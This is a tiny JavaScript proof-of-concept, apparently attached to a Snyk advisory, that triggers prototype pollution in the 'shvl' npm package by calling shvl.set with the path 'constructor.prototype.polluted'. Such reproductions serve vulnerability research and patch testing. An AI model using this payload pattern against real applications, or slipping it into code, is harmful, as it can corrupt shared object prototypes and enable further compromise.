//https://snyk.io/vuln/SNYK-JS-SHVL-1085284

 
  var shvl = require("shvl");
  obj = {};

   

  shvl.set(obj, "constructor.prototype.polluted", "yes");
// End of file
